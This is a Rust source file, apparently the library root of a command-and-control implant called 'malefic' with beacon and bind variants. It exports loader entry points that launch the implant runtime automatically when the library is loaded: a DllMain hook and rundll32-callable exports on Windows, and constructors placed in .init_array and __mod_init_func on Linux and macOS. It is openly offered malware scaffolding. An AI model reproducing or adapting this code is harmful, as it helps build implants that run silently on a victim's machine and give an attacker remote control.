#[cfg(feature = "beacon")]
mod beacon;
#[cfg(feature = "bind")]
mod bind;
mod bootstrap;
mod session_loop;

#[cfg(feature = "beacon")]
pub use beacon::MaleficBeacon;
#[cfg(feature = "bind")]
pub use bind::MaleficBind;

pub use bootstrap::run;

// ============================================================================
// Platform entry points (cdylib / shared library only)
// ============================================================================

fn spawn_malefic_runtime() {
    static ONCE: std::sync::Once = std::sync::Once::new();
    ONCE.call_once(|| {
        std::thread::spawn(|| {
            use futures::executor::block_on;
            let _ = block_on(async { run(malefic_proto::get_sid()).await });
        });
    });
}

/// Windows: entry callable via rundll32
#[cfg(target_os = "windows")]
#[no_mangle]
pub extern "system" fn Run(_hwnd: isize, _hinst: isize, _cmdline: *const u8, _show: i32) {
    spawn_malefic_runtime();
}

/// Windows: blocking entry, keeps caller alive until run completes
#[cfg(target_os = "windows")]
#[no_mangle]
pub extern "system" fn RunBlocking(_hwnd: isize, _hinst: isize, _cmdline: *const u8, _show: i32) {
    use futures::executor::block_on;
    let _ = block_on(async { run(malefic_proto::get_sid()).await });
}

/// Windows: auto trigger via LoadLibrary (DllMain)
#[cfg(target_os = "windows")]
#[no_mangle]
pub extern "system" fn DllMain(
    _hinst: usize,
    reason: u32,
    _reserved: *mut core::ffi::c_void,
) -> i32 {
    const DLL_PROCESS_ATTACH: u32 = 1;
    if reason == DLL_PROCESS_ATTACH {
        spawn_malefic_runtime();
    }
    1
}

/// Linux: export `run` symbol for dlsym; constructor auto-spawns thread on dlopen
#[cfg(target_os = "linux")]
#[export_name = "run"]
pub extern "C" fn _lib_run_export() {
    spawn_malefic_runtime();
}

#[cfg(target_os = "linux")]
extern "C" fn init_constructor() {
    spawn_malefic_runtime();
}

#[cfg(target_os = "linux")]
#[used]
#[link_section = ".init_array"]
static INIT_ARRAY: extern "C" fn() = init_constructor;

/// macOS: export `run` symbol for dlsym; constructor auto-spawns thread on dlopen
#[cfg(target_os = "macos")]
#[export_name = "run"]
pub extern "C" fn _lib_run_export() {
    spawn_malefic_runtime();
}

#[cfg(target_os = "macos")]
extern "C" fn init_constructor() {
    spawn_malefic_runtime();
}

#[cfg(target_os = "macos")]
#[used]
#[link_section = "__DATA,__mod_init_func"]
static INIT_ARRAY: extern "C" fn() = init_constructor;
